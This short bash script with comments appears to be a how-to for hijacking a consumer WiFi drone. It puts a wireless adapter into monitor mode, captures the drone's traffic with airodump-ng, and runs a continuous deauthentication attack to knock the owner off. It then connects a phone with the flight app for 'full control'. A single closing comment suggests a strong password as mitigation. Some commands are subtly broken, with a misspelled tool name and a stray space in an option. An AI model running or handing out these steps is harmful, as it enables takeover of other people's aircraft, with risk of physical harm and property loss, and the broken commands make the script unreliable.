#!/bin/bash
# use Kali linux; plug in WiFi adaptor (TP-Link TP-WN722N for example) with monitor mode

sudo su

airmon-ng start wlan1

airmon-ng check kill

airodump-ng wlan1mon "SSID of target drone"

airodump-ng -c 6 -- bssid "bssid of target drone" -w /root/drone wlan1mon

# wait for airodump to show data
# open second terminal

airereplay-ng -0 0 -a "bssid" -c "Station" wlan1mon # deauth attack

# connect with phone for full control. Use drone flight app.

# mitigate with strong password